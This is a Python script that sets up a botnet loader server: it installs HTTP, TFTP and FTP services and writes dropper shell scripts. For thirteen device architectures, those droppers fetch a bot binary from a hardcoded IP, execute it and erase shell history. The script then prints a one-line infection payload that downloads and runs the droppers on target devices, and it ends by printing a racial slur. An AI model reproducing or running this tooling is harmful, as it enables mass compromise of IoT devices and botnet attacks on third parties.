import subprocess, sys, urllib
ip = "109.104.151.112"
exec_bin = "botsh"
bin_prefix = "bot."
archs = ["x86",
"mips",
"mipsel",
"arm4",
"arm5",
"arm6",
"arm7",
"ppc", 
"m68k",
"i586",
"i686",
"spc",
"sh4"] 
def run(cmd):
    subprocess.call(cmd, shell=True)
print("ready?")
print(" ")
run("yum install httpd -y &> /dev/null")
run("service httpd start &> /dev/null")
print("3")
run("yum install xinetd tftp tftp-server -y &> /dev/null")
run("yum install vsftpd -y &> /dev/null")
run("service vsftpd start &> /dev/null")
run('''echo "service tftp
{
    socket_type             = dgram
    protocol                = udp
    wait                    = yes
    user                    = root
    server                  = /usr/sbin/in.tftpd
    server_args             = -s -c /var/lib/tftpboot
    disable                 = no
    per_source              = 11
    cps                     = 100 2
    flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')  
print("2")
run("service xinetd start &> /dev/null")
run('''echo "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
run("service vsftpd restart &> /dev/null")
run("service xinetd restart &> /dev/null")
print("Creating .sh Bins")
print(" ")
run('echo "#!/bin/bash" > /var/lib/tftpboot/tbot.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/tbot.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tbot.sh')
run('echo "#!/bin/bash" > /var/lib/tftpboot/tbot2.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/tbot2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tbot2.sh')
run('echo "#!/bin/bash" > /var/www/html/bot.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/tbot2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tbot2.sh')
run('echo "#!/bin/bash" > /var/ftp/bot1.sh')
run('echo "ulimit -n 1024" >> /var/ftp/bot1.sh')
print("1")
run('echo "cp /bin/busybox /tmp/" >> /var/ftp/bot1.sh')
for i in archs:
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+i+'; history -c; rm -rf ~/.bash_history" >> /var/www/html/bot.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' '+bin_prefix+i+' '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+i+'; history -c; rm -rf ~/.bash_history" >> /var/ftp/bot1.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+i+'; history -c; rm -rf ~/.bash_history" >> /var/lib/tftpboot/tbot.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r '+bin_prefix+i+' -g ' + ip + ';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+i+'; history -c; rm -rf ~/.bash_history" >> /var/lib/tftpboot/tbot2.sh')    
run("service xinetd restart &> /dev/null")
run("service httpd restart &> /dev/null")
run('echo -e "ulimit -n 99999" >> ~/.bashrc')
print("\x1b[0;34mPayload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/bot.sh; curl -O http://" + ip + "/bot.sh; chmod 777 bot.sh; sh bot.sh; tftp " + ip + " -c get tbot.sh; chmod 777 tbot.sh; sh tbot.sh; tftp -r tbot2.sh -g " + ip + "; chmod 777 tbot2.sh; sh tbot2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " bot1.sh bot1.sh; sh bot1.sh; rm -rf bot.sh tbot.sh tbot2.sh bot1.sh; rm -rf *\x1b[0m")
print("")
print("boom nigga")
raw_input("press any key to exit....")
